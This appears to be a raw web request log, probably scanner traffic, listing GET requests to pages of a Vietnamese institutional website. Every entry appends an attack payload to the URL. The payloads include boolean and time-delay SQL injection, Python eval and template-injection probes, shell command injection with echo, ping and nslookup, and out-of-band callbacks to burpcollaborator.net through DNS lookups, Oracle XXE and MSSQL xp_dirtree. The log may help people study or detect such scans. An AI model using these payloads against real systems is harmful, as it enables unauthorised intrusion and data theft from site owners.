GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an16666909'%20or%20'8957'%3d'8957/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt78114662'%20or%202726%3d2726--%20/,1
GET/index.php/2017/03/16/bieu-mau81606561'%20or%20'5416'%3d'5416/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm24804950'%20or%204690%3d4690--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tanllika%25%3err7hi'/%22%3cq66yy/,1
GET/index.php/2017/03/16/cac-truong-doi-tac14237738'%20or%20'9529'%3d'9531/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt35036298'%20or%20'2203'%3d'2203/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%20and%20'7633'%3d'7642/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an45003545'%20or%20'3588'%3d'3597/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/bieu-mau12132544'%20or%20'1573'%3d'1580/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm99373822'%20or%206122%3d6123--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt13922079'%20or%208935%3d8940--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac97631063'%20or%208213%3d8213--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt61496123'%20or%20'3775'%3d'3778/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%20and%204579%3d4579--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien40449184'%20or%20'5355'%3d'5355/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an60142858'%20or%209655%3d9655--%20/,1
GET/index.php/2017/03/16/bieu-mau94842605'%20or%203670%3d3670--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%20and%20'3259'%3d'3259/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%20and%20'4252'%3d'4252/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac63011797'%20or%209744%3d9748--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt49230643'%20or%201360%3d1360--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%20and%208763%3d8772--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien46257263'%20or%20'5990'%3d'5994/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an22029576'%20or%209442%3d9447--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%20and%20'4172'%3d'4175/,1
GET/index.php/2017/03/16/bieu-mau59656589'%20or%206314%3d6315--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%20and%20'6018'%3d'6022/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%20and%20'5501'%3d'5501/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa%7d%7dhpovd'/%22%3cw2s14/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt66216829'%20or%206165%3d6168--%20/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt49268884'%20or%20'7991'%3d'7991/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%20and%201126%3d1126--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien66929277'%20or%206901%3d6901--%20/,1
GET/index.php/2017/03/13/van-phong-du-an'%20and%20'6022'%3d'6022/,1
GET/index.php/2017/03/16/bieu-mau'%20and%20'9715'%3d'9715/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%20and%209429%3d9429--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'.sleep(20).'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%20and%20'6403'%3d'6405/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa%25%7dl7xa2'/%22%3cfwn70/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt72328638'%20or%20'6766'%3d'6772/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%20and%20'8651'%3d'8651/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien45061100'%20or%204671%3d4672--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%20and%202686%3d2695--%20/,1
GET/index.php/2017/03/16/bieu-mau'%20and%20'8169'%3d'8170/,1
GET/index.php/2017/03/13/van-phong-du-an'%20and%20'5014'%3d'5015/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%20and%209325%3d9333--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%20and%205759%3d5759--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%20and%20'1408'%3d'1410/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoaggdib%25%3eiie5u'/%22%3cgjz1o/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%20and%20'8350'%3d'8350/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt98504710'%20or%202371%3d2371--%20/,1
GET/index.php/2017/03/13/van-phong-du-an'%20and%208976%3d8976--%20/,1
GET/index.php/2017/03/16/bieu-mau'%20and%207100%3d7100--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%20and%209525%3d9525--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%20and%205976%3d5982--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%20and%20'2390'%3d'2397/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm%7d%7djxdpb'/%22%3clm41y/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt92132439'%20or%207711%3d7715--%20/,1
GET/index.php/2017/03/13/van-phong-du-an'%20and%203183%3d3192--%20/,1
GET/index.php/2017/03/16/bieu-mau'%20and%207143%3d7146--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%20and%207803%3d7803--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%20and%201535%3d1541--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm%25%7dk9j31'/%22%3cm8bpj/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%20and%20'3456'%3d'3456/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%20and%205883%3d5890--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpmjn3vo%25%3eem3kv'/%22%3cvlfty/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%20and%20'6857'%3d'6859/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt%7d%7dofz6a'/%22%3cvo1co/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm%7d%7du4lft'/%22%3cwnp3o/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%22%600%26nslookup%20-q%3dcname%20pa3txcnq9o7es7skma2vqme9r0xsyqmnakxalz.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt%25%7dlt328'/%22%3cvxhhb/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'.sleep(20).'/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm%25%7dru8p9'/%22%3chp2cp/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%20and%209281%3d9281--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan%26nslookup%20-q%3dcname%20ii4m55vjhhf7000du3aoyfm2zt5l6jueib51tq.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20ii4m55vjhhf7000du3aoyfm2zt5l6jueib51tq.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac%7d%7dlaj0h'/%22%3cyeiod/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmtjqvv6%25%3erf9pc'/%22%3cqs1jh/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttmwpnai%25%3evwlk6'/%22%3cy1vgf/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%20and%202115%3d2120--%20/,1
GET/index.php/2017/03/13/van-phong-du-an%7d%7dfjhg6'/%22%3cn1jkb/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan%7cecho%2045x3bnzgwu%20hcz30fiks4%7c%7ca%20%23'%20%7cecho%2045x3bnzgwu%20hcz30fiks4%7c%7ca%20%23%7c%22%20%7cecho%2045x3bnzgwu%20hcz30fiks4%7c%7ca%20%23/,1
GET/index.php/2017/03/16/bieu-mau%7d%7drbvps'/%22%3cpe0op/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/16/cac-truong-doi-tac%25%7dd2fnd'/%22%3coy3nl/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt%7d%7dy7dhr'/%22%3cc24i2/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/van-phong-du-an%25%7dbfvj1'/%22%3czq9lt/,1
GET/index.php/2017/03/16/bieu-mau%25%7dad3u1'/%22%3cx28j1/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien%7d%7do39jn'/%22%3ciubg5/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'.sleep(20).'/,1
GET/index.php/2017/03/16/cac-truong-doi-tacltdlf%25%3ecc6m7'/%22%3ch20hb/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt%25%7dspcus'/%22%3covt5f/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/13/van-phong-du-anusmta%25%3ezh2q4'/%22%3cqgqn9/,1
GET/index.php/2017/03/16/bieu-mauusfqz%25%3enkwhy'/%22%3cipzbg/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien%25%7dykcey'/%22%3ce2mnv/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmtkx4xs%25%3effckj'/%22%3cwjhv0/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/13/van-phong-du-an'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/16/bieu-mau'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%7cecho%20v7f4qcegl5%20jhvq07eycq%20%23xzwx/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trienpui49%25%3et1ewa'/%22%3co6bg0/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%22%600%26nslookup%20-q%3dcname%20c6jgtzjd5b31ouo7ixyim9awnntfueib68tyhn.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'.sleep(20).'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'.sleep(20).'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt%7d%7dqrijv'/%22%3cveii2/,1
GET/index.php/2017/03/13/van-phong-du-an'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/,1
GET/index.php/2017/03/16/bieu-mau'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa%26nslookup%20-q%3dcname%20xij15kvyhwfm0f0suia3yumhz8506zuuir5ht6.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20xij15kvyhwfm0f0suia3yumhz8506zuuir5ht6.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt%25%7dh3ay4'/%22%3chizid/,1
GET/index.php/2017/03/16/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'.sleep(20).'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa%7cecho%20nbrbnilso5%208y9rwil42j%7c%7ca%20%23'%20%7cecho%20nbrbnilso5%208y9rwil42j%7c%7ca%20%23%7c%22%20%7cecho%20nbrbnilso5%208y9rwil42j%7c%7ca%20%23/,1
GET/index.php/2017/03/13/van-phong-du-an'.sleep(20).'/,1
GET/index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-ttfb5uu%25%3ez6bgf'/%22%3cp6etp/,1
GET/index.php/2017/03/16/bieu-mau'.sleep(20).'/,1
GET/index.php/2017/03/18/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%22%600%26nslookup%20-q%3dcname%20ck0g7zxdjbh12u27wxci09ow1n7f8fwck97zvo.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'.sleep(20).'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%7cping%20-c%2021%20127.0.0.1%20%23/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%2bsleep(20.to_i)%2b'/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'.sleep(20).'/,1
GET/index.php/2017/03/16/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20hpwyt%20system%20%22http%3a//86cctvj9573xoqo3ityem5asnjtbv2j572usih.burpcollab'%7c%7c'orator.net/%22%3e%25hpwyt%3b]%3e')%2c'/l')%20from%20dual)/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm%26nslookup%20-q%3dcname%20qlfu8dyrkpif383lxbdw1npa218t9txoll8bw0.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20qlfu8dyrkpif383lxbdw1npa218t9txoll8bw0.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20hpwyt%20system%20%22http%3a//1875vol2705qqjqwkm07oyclpcv4xvlz9wwmkb.burpcollab'%7c%7c'orator.net/%22%3e%25hpwyt%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%7cecho%20ibyr6ibon6%20x404dvml6n%20%23xzwx/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm%7cecho%20sd3xj6gfnu%20sdkm4qv9aa%7c%7ca%20%23'%20%7cecho%20sd3xj6gfnu%20sdkm4qv9aa%7c%7ca%20%23%7c%22%20%7cecho%20sd3xj6gfnu%20sdkm4qv9aa%7c%7ca%20%23/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%22%600%26nslookup%20-q%3dcname%204fk82rs5e3ctxmxzrp7av1jowf2738r5f22sqh.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%22%600%26nslookup%20-q%3dcname%204w18jr95v3ttemez8poac10odfj7ka87w4ju7j.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvcbzzipwbu9kuduqog41ssgft6zy1ppgf4cr2fr.burpcollab'%2b'orator.net%5cvfj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt%26nslookup%20-q%3dcname%20kj7o67wlijg9121fv5bqzhn40v6n7ovjjg66uv.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20kj7o67wlijg9121fv5bqzhn40v6n7ovjjg66uv.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm%26nslookup%20-q%3dcname%20yln28lyzkxin3g3txjd41vpi298194xzlw8mwb.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20yln28lyzkxin3g3txjd41vpi298194xzlw8mwb.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'.sleep(20).'/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cpwptjc9qvotee7ek8aovcm09d0jslj9a0yxln9c.burpcollab'%2b'orator.net%5ckqe'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/van-phong-du-an'%22%600%26nslookup%20-q%3dcname%20hj4l64wiigg61z1cv2bnzen10s6k7ovlji68ux.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%22%600%26nslookup%20-q%3dcname%20qicu5dvrhpff080lubawynmaz15t7jvgjd63us.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt%7cecho%201772wiqlt6%20rmrypzt5gi%7c%7ca%20%23'%20%7cecho%201772wiqlt6%20rmrypzt5gi%7c%7ca%20%23%7c%22%20%7cecho%201772wiqlt6%20rmrypzt5gi%7c%7ca%20%23/,1
GET/index.php/2017/03/16/bieu-mau'%22%600%26nslookup%20-q%3dcname%20ua8yxhnv9t7jscspmf20qreer5xxy2mzawxmlb.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm%7cecho%20ws2oaqfwk3%20e5jgkk8myl%7c%7ca%20%23'%20%7cecho%20ws2oaqfwk3%20e5jgkk8myl%7c%7ca%20%23%7c%22%20%7cecho%20ws2oaqfwk3%20e5jgkk8myl%7c%7ca%20%23/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ciykml5bjxhv7g0gda3qoef22ftllncb33r0eq2f.burpcollab'%2b'orator.net%5ceyw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/van-phong-du-an%26nslookup%20-q%3dcname%20as6efx5br9pzasa54vkg87wu9lfdgh4cs9fz3o.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20as6efx5br9pzasa54vkg87wu9lfdgh4cs9fz3o.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%7cecho%20qp5tyheqxu%205fy5lqirdp%20%23xzwx/,1
GET/index.php/2017/03/16/cac-truong-doi-tac%26nslookup%20-q%3dcname%20r91vwems8q6gr9rmlc1xpodbq2wuykmfacx2lr.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20r91vwems8q6gr9rmlc1xpodbq2wuykmfacx2lr.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%22%600%26nslookup%20-q%3dcname%20wrr0ej4xqvol9e9r3hj27tvg87ezf13yrvel2a.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/16/bieu-mau%26nslookup%20-q%3dcname%20wff02jsxevclxexrrh72vtjgw72z34rzfw2mqb.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20wff02jsxevclxexrrh72vtjgw72z34rzfw2mqb.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%22%600%26nslookup%20-q%3dcname%20qhbu4durgpefz8zltb9wxnlay14t6mujig56tv.burpcollaborator.net.%26%60'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%7cping%20-c%2021%20127.0.0.1%20%23/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfn6ja20gmek45x5az0fl3crz4qaic900toqbgz5.burpcollab'%2b'orator.net%5cuqo'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/van-phong-du-an%7cecho%200vk3j44whr%2009cu9ehhoc%7c%7ca%20%23'%20%7cecho%200vk3j44whr%2009cu9ehhoc%7c%7ca%20%23%7c%22%20%7cecho%200vk3j44whr%2009cu9ehhoc%7c%7ca%20%23/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/,1
GET/index.php/2017/03/16/cac-truong-doi-tac%7cecho%20sn6dtpnzob%209jmgd17850%7c%7ca%20%23'%20%7cecho%20sn6dtpnzob%209jmgd17850%7c%7ca%20%23%7c%22%20%7cecho%20sn6dtpnzob%209jmgd17850%7c%7ca%20%23/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt%26nslookup%20-q%3dcname%20tifx5gvuhsfi0b0oueazyqmdz45w6yutiq5gt5.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20tifx5gvuhsfi0b0oueazyqmdz45w6yutiq5gt5.burpcollaborator.net.%26%60'/,1
